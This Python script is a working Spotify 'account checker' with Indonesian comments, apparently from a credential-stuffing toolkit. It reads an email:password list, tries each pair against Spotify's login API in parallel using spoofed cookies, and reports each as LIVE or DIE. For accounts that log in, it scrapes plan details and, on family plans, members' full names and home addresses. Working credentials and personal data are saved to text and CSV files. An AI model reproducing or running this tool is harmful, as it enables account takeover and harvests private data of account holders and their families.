import requests,json
import re, os
import time
import datetime
from bs4 import BeautifulSoup
from multiprocessing import pool
from colorama import Fore, Style, init

#Color script
HEADER = Fore.LIGHTMAGENTA_EX
OKBLUE = Fore.LIGHTBLUE_EX
GREEN = Fore.LIGHTGREEN_EX
WARNING = Fore.LIGHTYELLOW_EX
FAIL = Fore.RED

def header():
    print('{}               ╭━━━╮╱╱╱╱╱╭╮╱╱╱╭╮'.format(WARNING))
    print('               ┃╭━╮┃╱╱╱╱╭╯╰╮╱╱┃┃')
    print('               ┃╰━━┳━━┳━┻╮╭╋━━┫╰━╮')
    print('               ╰━━╮┃╭╮┃╭╮┃┃┃╭━┫╭╮┃')
    print('               ┃╰━╯┃╰╯┃╰╯┃╰┫╰━┫┃┃┃')
    print('               ╰━━━┫╭━┻━━┻━┻━━┻╯╰╯')
    print('               ╱╱╱╱┃┃')
    print('               ╱╱╱╱╰╯{}'.format(WARNING))
    print('                   (~Spotch~)')
    print(' ')
    print('{}         -----------------------------------  '.format(WARNING))
    print('       -=[     {}Spotify Account Checker{}     ]=-'.format(GREEN, WARNING))
    print('       -=[   {}created by Yusril Rapsanjani{}  ]=-'.format(GREEN, WARNING))
    print('       -=[              {}v1.1{}               ]=-'.format(GREEN, WARNING))
    print('         -----------------------------------  ')
    print('')

def WriteoutResult(data):
  output = "----------------------------------------------\n"
  output += "Email: {}\n".format(data['Email'])
  output += "Password: {}\n".format(data['Password'])
  output += "Country: {}\n".format(data['Country'])
  if data['Admin'] != None:
    output += "Admin: {}\n".format(str(data['Admin']).replace("True", "Yes").replace("False", "No"))
  output += "Account Type: {}\n".format(data['Account Type'])
  if data['Expired'] != "":
    output += "Expired: {}\n".format(data['Expired'])

  now = datetime.datetime.now()
  waktu = now.strftime("%d-%m-%Y %H:%M")
  csv_payload = "{}, {}, {}, {}, {}, {}".format(str(waktu), data['Email'], data['Password'], data['Country'], data['Expired'], data['Account Type'])
  
  city = ''
  if 'Family' in data['Account Type']:
    if data['Family']:
      if data['Family']['Master']:
        if data['Family']['Master']['Address']:
          address = data['Family']['Master']['Address']['line1'].replace(",", "")
          city = data['Family']['Master']['Address']['city']
          postalCode = data['Family']['Master']['Address']['postalCode']
        else:
          address = ''
          city = ''
          postalCode = ''

        csv_payload += ", {}, {}, {}, {}".format(data['Family']['Master']['Username'], data['Family']['Master']['Username'], data['Family']['Master']['Fullname'], city)
        csv_payload += ", {}, {}".format(address, postalCode)

        output += "Family:\n"
        output += "       [*] Master: \n"
        output += "             - Username: {}\n".format(data['Family']['Master']['Username'])
        output += "             - Fullname: {}\n".format(data['Family']['Master']['Fullname'])
        output += "             - isMaster: {}\n".format(str(data['Family']['Master']['isMaster']).replace("True", "Yes"))
        output += "             - Address: \n"
        output += "                       - City: {}\n".format(city)
        output += "                       - Alamat: {}\n".format(address)
        output += "                       - PostalCode: {}\n".format(postalCode)
      else:
        address = ''
        city = ''
        postalCode = ''
    
      if data['Family']['Members']:
        output += "       [*] Members: "
        for member in data['Family']['Members']:
          output += "\n             - Username: {}\n".format(member['Username'])
          output += "             - Fullname: {}\n".format(member['Fullname'])
          output += "             - CanInvite: {}\n".format(str(member['CanInvite']).replace("False", "No").replace("True", "Yes"))
          output += "             - Address: \n"
          output += "                       - City: {}\n".format(member['Address']['city'])
          output += "                       - Alamat: {}\n".format(member['Address']['line1'])
          output += "                       - PostalCode: {}\n".format(member['Address']['postalCode'])
          output += " "
          address = member['Address']['line1'].replace(",", "")
          csv_payload += ", '', {}, {}, {}, {}, {}".format(member['Username'], member['Fullname'], member['Address']['city'], address, member['Address']['postalCode'])
          

  liveOutput = "  {0}{3}{0}|{4}{0}|{1}Country: {5}{0}|{2}{6}{0}".format(HEADER, OKBLUE, GREEN, data['Email'], data['Password'], data['Country'], data['Account Type'])
  if data['Expired'] != "":
    liveOutput += "{}|{}Expired: {}".format(HEADER, GREEN, data['Expired'])
  liveOutput += " {0}=> {1}LIVE!".format(HEADER, GREEN)
  #print("  {}:{}|{}|{}|{} => LIVE!".format(data['Email'], data['Password'], data['Country'], data['Account Type'], data['Expired']))
  print(liveOutput)

  #Writeout to file
  with open("spotify-valid.txt", "a") as f:
    f.write(output)
    f.close()

  #Save csv
  output_csv = open("spotify.csv", "a")
  output_csv.write(csv_payload + ", \n")
  output_csv.close()

def parseAccount(data, email, password):
  parser = BeautifulSoup(data, "lxml")

  account_type = parser.find("h3", attrs={"class" : "product-name"}).text
  country = parser.find("p", attrs={"class" : "form-control-static", "id" : "card-profile-country"}).text
  admin = None
  try:
    expired = parser.find("b", attrs={"class" : "recurring-date"}).text
    expired = expired.replace(".", "/")
  except:
    expired = ''
    pass

  if account_type == "Premium Family":
    if len(parser.find_all("h3", attrs={"class" : "product-name"})) == 2:
      admin = True
    else:
      admin = False
  
  return "success", email, password, account_type, country, admin, expired

def parseFamily(data):
  pattern = re.findall('familyPlanData:\s"(.*)",', str(data))

  #DECRYPT HEX TO PLAIN
  if pattern:
    patt = bytes(pattern[0], encoding='latin1')
    family_data = json.loads(patt.decode('unicode-escape'))
    
    #GET  Master Family
    rootMaster = family_data['master']
    master = {
      'Username': rootMaster['username'] if rootMaster['username'] != None else '',
      'isMaster': rootMaster['isMaster'] if rootMaster['isMaster'] != None else False,
      'Address': rootMaster['address'] if rootMaster['address'] != None else '',
      'Fullname': rootMaster['fullName'] if rootMaster['fullName'] != None else ''
    }
    
    memberlist = []
    rootMember = family_data['members']
    for member in rootMember:
      tmp = {
        'Username': member['username'],
        'Address': member['address'],
        'CanInvite': member['canInvite'],
        'Fullname': member['fullName'],
        'Email': member['email']
      }
      memberlist.append(tmp)

    data = {
      'Master': master,
      "Members": memberlist
    }

    return data
  else:
    return " "

def getFamilyList(sessi):
  resp = sessi.get('https://www.spotify.com/id/family/overview/')
  if resp.status_code == 200:
    data = resp.text

    family_data = parseFamily(data)

    return family_data

def getAccountInfo(sessi, email, password):
  resp = sessi.get('https://www.spotify.com/de/account/overview/')
  if resp.status_code == 200:
    data = resp.text

    status, email, password, account_type, country, admin, expired = parseAccount(data, email, password)

    #Jika akunnya tipe premium family
    family_data = {}
    if 'Family' in account_type:
      fam = getFamilyList(sessi)
      if fam != " ":
        family_data = fam
    else:
      family_data = ' '

    
    data = {
      'Status': status,
      "Email": email,
      "Password": password,
      "Account Type": account_type,
      "Country": country,
      "Admin": admin,
      "Family": family_data,
      "Expired": expired
    }
    
    WriteoutResult(data)


def isEmpasExists():
    #Input lokasi empass
    empasPath = input("  [?] Masukkan lokasi file empass [ex: /root/akun.txt]: ")
    if not os.path.exists(empasPath):
        return False, empasPath
    else:
        return True, empasPath

def savePath():
    savePath = input("  [?] Masukkan lokasi file penyimpanan [ex: /root/output]: ")
    if not os.path.exists(savePath):
        return False, savePath
    else:
        return True, savePath
'''

Mengambil list empass dari file, pastikan
path lokasi benar.

'''
def GetDataEmail(empasPath):
    with open(empasPath, 'r') as f:
        account = f.readlines()
        return account

def spotifyCheck(data):
  try:
    valid = 0
    split = data.split(":")
    email = split[0].lower()
    password = split[1].replace("\n", "")

    csrf_req = requests.get('https://accounts.spotify.com')
    if csrf_req.status_code == 200:
      csrf_token = csrf_req.cookies.get("csrf_token")

    api_request = requests.Session()

    cookies = {"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F", "sp_landing" : "play.spotify.com%2F", "sp_landingref" : "https%3A%2F%2Fwww.google.com%2F", "user_eligible" : "0", "spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D", "sp_t" : "ac1439ee6195be76711e73dc0f79f89", "sp_new" : "1", "csrf_token" : csrf_token, "__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=", "remember" : "false@false.com", "_ga" : "GA1.2.153026989.1498061376", "_gid" : "GA1.2.740264023.1498061376"}
    headers = {"User-Agent" : "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4", "Accept" : "application/json, text/plain", "Content-Type": "application/x-www-form-urlencoded"}
    payload = {"remember" : "false", "username" : email, "password" : password, "csrf_token" : csrf_token}
    response = api_request.post("https://accounts.spotify.com/api/login", data=payload, headers=headers, cookies=cookies)
    
    if 'error' in response.text:
      print("{}  {}|{} => {}DIE!".format(HEADER, email, password , FAIL))
    else:
      getAccountInfo(api_request, email, password)
      valid += 1
  except:
    pass

  return valid

valid = 0
def main():
  global valid
  status, empasPath = isEmpasExists()
  if status == False:
    print('  [x] Lokasi path empass tidak ditemukan!')
    main()
    return

  #Jumlah prosesor yang diinginkan
  #10 Prosesor => 10 email per proses 
  prosesor = input("  [?] Berapa prosesor yang ingin dipakai?: ")
  if prosesor == "":
    prosesor = "2"
  prosesor = int(prosesor)

  #Get Empas List
  accountList = GetDataEmail(empasPath)

  #Start timer
  starts = time.time()

  #Create CSV
  if not os._exists("spotify.csv"):
    output_csv = open("spotify.csv", "w")
    output_csv.write("date check, email, password, country, expired, account_type, family owner, master_username, master_fullname, master_city, master_address, master_postal, user1_email, user1_username, user1_fullname, user1_city, user1_address, user1_postal, user2_email, user2_username, user2_fullname, user2_city, user2_address, user2_postal, user3_email, user3_username, user3_fullname, user3_city, user3_address, user3_postal, user4_email, user4_username, user4_fullname, user4_city, user4_address, user4_postal, user5_email, user5_username, user5_fullname, user5_city, user5_address, user5_postal, \n")

    output_csv.close()

  print("  ---------------------------------------\n")

  #Membuat pool object dengan prosesor sesuai yang diset
  pools = pool.Pool(processes=prosesor)
  #Proses memecah fungsi menjadi beberapa proses pada prosesor
  result = pools.map(spotifyCheck, accountList)

  #Setelah selesai, dia mematikan pool
  pools.close()
  #Kemudian menyatukan kembali proses menjadi 1
  pools.join()

  valid = 0
  for res in result:
    if res == 1:
      valid += 1

  #Perhitungan estimasi waktu
  finish = int(time.time()-starts)
  if finish < 60:
      estimasi = "{} seconds".format(str(finish))
  else:
      finish /= 60
      estimasi = "{} minutes".format(str(finish))

  print("")
  print("{}  ---------------------------------------".format(WARNING))
  print("  Total Valid: {}{}{} Account".format(GREEN, str(valid), WARNING))
  print("  Checking {}{}{} Account in {}{}".format(GREEN, len(accountList), WARNING, GREEN, estimasi))

if __name__ == "__main__":
  header()
  main()


